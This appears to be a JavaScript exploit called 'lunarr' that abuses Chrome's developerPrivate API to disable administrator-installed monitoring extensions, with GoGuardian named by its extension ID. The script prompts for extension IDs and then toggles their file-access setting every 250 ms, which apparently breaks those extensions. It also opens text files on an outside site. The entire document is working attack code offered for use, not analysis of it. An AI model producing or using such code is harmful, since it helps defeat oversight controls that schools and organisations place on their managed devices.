if (location.href === "about:blank") {
  let shim = false;
  var input = prompt("🌙 lunarr | enter the goguardian id key");
  if (input === "secret key" || input === "matters") {
    var ids = ["haldlgldplgnggkjaafhelgiaglafanh"];
  } else {
    var ids = input.split(",");
  }
  setInterval(() => {
    ids.forEach((id) => {
      opener.chrome.developerPrivate.updateExtensionConfiguration({
        extensionId: id,
        fileAccess: shim
      });
      shim = !shim;
    });	
  }, 250);
  if (ids[0] === "haldlgldplgnggkjaafhelgiaglafanh") {
    window.open("https://main-frame.dev/LKJHI-ZYXWV-98UIO-76TRE.txt", "_blank");
  } else {
    window.open("https://main-frame.dev/AJDKL-IWIS1-39SDN-23HJL.txt", "_blank");
  }
} else {
  alert("🌙 lunarr | this is a cool website but sadly, you need to be in the Untitled page!");
    window.open("https://main-frame.dev/AJDKL-IWIS1-39SDN-23HJL.txt", "_blank");
}
